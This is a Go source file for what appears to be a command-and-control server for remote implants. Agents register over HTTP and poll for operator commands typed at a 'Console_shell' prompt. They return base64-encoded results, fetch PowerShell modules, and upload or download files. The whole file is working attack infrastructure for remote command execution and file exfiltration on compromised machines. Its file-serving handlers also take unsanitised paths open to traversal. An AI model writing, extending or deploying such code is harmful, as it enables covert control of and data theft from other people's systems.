package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"regexp"
	"io/ioutil"
	"github.com/axgle/mahonia"
	"time"
	"math/rand"
)

var (
	cmd    string = ""
	AGENTS map[string]string
)


func  GetRandomString(l int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyz"
	bytes := []byte(str)
	result := []byte{}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < l; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	return string(result)
}

func sayhelloName(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()

	//url正则
	url_info, _ := regexp.Compile("/info/*")
	url_md, _ := regexp.Compile("/md/*")
	url_cm, _ := regexp.Compile("/cm/*")
	url_re, _ := regexp.Compile("/re/*")
	url_up, _ := regexp.Compile("/up/*")
	url_img, _ := regexp.Compile("/img/*")

	//info
	if url_info.MatchString(r.URL.Path) {
		data := mahonia.NewDecoder("gbk").ConvertString(string(r.Form.Get("data")))
		fmt.Println("Form", data)
		AGENTS = make(map[string]string)
		url_path, _ := regexp.Compile(`[A-Z]+`)
		id := url_path.FindString(r.URL.Path)
		AGENTS[id] = "ok"

	//md执行命令
	} else if url_cm.MatchString(r.URL.Path) {
		url_path, _ := regexp.Compile(`[A-Z]+`)
		var id = url_path.FindString(r.URL.Path)
		_, ok := AGENTS[id]
		if ok {
			if cmd != "" {
				fmt.Fprint(w, cmd)
				cmd = ""
				_ = r.Close
			} else {
				fmt.Fprint(w, "")
			}
		} else {
			fmt.Fprintf(w, "REGISTER")

		}

	//re接收返回信息
	} else if url_re.MatchString(r.URL.Path) {
		web_data := r.Form.Get("data")
		decoded, _ := base64.StdEncoding.DecodeString(web_data)
		decodestr := string(decoded)
		fmt.Println("\n")
		fmt.Println(decodestr)

	//load加载ps模块
	} else if url_md.MatchString(r.URL.Path) {
		web_data := r.Form.Get("data")
		file_data, err := ioutil.ReadFile("./Modules/"+web_data)
    if err != nil {
        fmt.Println("Error reading module file", err)
        fmt.Fprintf(w, "")
        return
    }else{
    	fmt.Fprintf(w,string(file_data))
    }
		
	//up客户端下载文件
	} else if url_up.MatchString(r.URL.Path){
		web_data := r.Form.Get("data")
		file_data, err := ioutil.ReadFile("./file/"+web_data)
		if err != nil {
        fmt.Println("Read file error", err)
        fmt.Fprintf(w, "")
        return
    }else{
    	encodeString := base64.StdEncoding.EncodeToString(file_data)
    	fmt.Fprintf(w,(encodeString))
    }
	
	//img上传文件到服务端
	} else if url_img.MatchString(r.URL.Path){
		//bug
		//1.http里+会转义为空格
		//2.post上传有限制比较小
		//解决方法先这样反正解决方法比较多
		web_data := r.Form.Get("data")
		//decoded, _ := base64.StdEncoding.DecodeString(web_data)
		//decodestr := string(decoded)
		
		file, _ := os.Create("./upload/"+GetRandomString(5))
    file.WriteString(web_data)
    file.Close()
    fmt.Fprintf(w,("ok upload"))
    
	}	else {
		//全都不匹配输出请求详细
		//应增加ua头判断
		//先强制断开连接
		//fmt.Println(r.Close)
		////自动关闭服务器
		//
		//fmt.Println("Request解析")
		////HTTP方法
		//fmt.Println("method", r.Method)
		//// RequestURI是被客户端发送到服务端的请求的请求行中未修改的请求URI
		//fmt.Println("RequestURI", r.RequestURI)
		////URL类型,下方分别列出URL的各成员
		//fmt.Println("URL_scheme", r.URL.Scheme)
		//fmt.Println("URL_opaque", r.URL.Opaque)
		//fmt.Println("URL_user", r.URL.User.String())
		//fmt.Println("URL_host", r.URL.Host)
		//fmt.Println("URL_path", r.URL.Path)
		//fmt.Println("URL_RawQuery", r.URL.RawQuery)
		//fmt.Println("URL_Fragment", r.URL.Fragment)
		////协议版本
		//fmt.Println("proto", r.Proto)
		//fmt.Println("protomajor", r.ProtoMajor)
		//fmt.Println("protominor", r.ProtoMinor)
		//
		////打印全部头信息
		//for k, v := range r.Header {
		//	// fmt.Println("Header key:" + k)
		//	for _, vv := range v {
		//		fmt.Println("header key:" + k + "  value:" + vv)
		//	}
		//}
		//
		////解析body
		////r.ParseMultipartForm(128)
		////fmt.Println("解析方式:ParseMultipartForm")
		//r.ParseForm()
		//fmt.Println("解析方式:ParseForm")
		//
		////body内容长度
		//fmt.Println("ContentLength", r.ContentLength)
		//
		////打印全部内容
		//fmt.Println("Form", r.Form)
		//
		////该请求的来源地址
		//fmt.Println("RemoteAddr", r.RemoteAddr)
		//
		/////data:=r.RemoteAddr
		////发送邮件通知
		////SendMail("Danger notice ！！！！",data)
		////os.Exit(0)
		fmt.Fprintf(w, "")
	}
}

//func SendMail(subject string, body string ) error {
//    //定义邮箱服务器连接信息
//    mailConn := map[string]string {
//        "user": "",
//        "pass": "",
//        "host": "",
//        "port": "",
//    }
//
//    port, _ := strconv.Atoi(mailConn["port"]) //转换端口类型为int
//
//    m := gomail.NewMessage()
//    m.SetHeader("Subject", subject)  //设置邮件主题
//    m.SetBody("text/html", body)     //设置邮件正文
//
//    d := gomail.NewDialer(mailConn["host"], port, mailConn["user"], mailConn["pass"])
//
//    err := d.DialAndSend(m)
//    return err
//
//}

func Scanf(a *string) {
	reader := bufio.NewReader(os.Stdin)
	data, _, _ := reader.ReadLine()
	*a = string(data)
}
func main() {
	http.HandleFunc("/", sayhelloName) //设置访问的路由

	go http.ListenAndServe(":9090", nil) //设置监听的端口
	for true {

		fmt.Print("Console_shell >")
		Scanf(&cmd)
	}

}
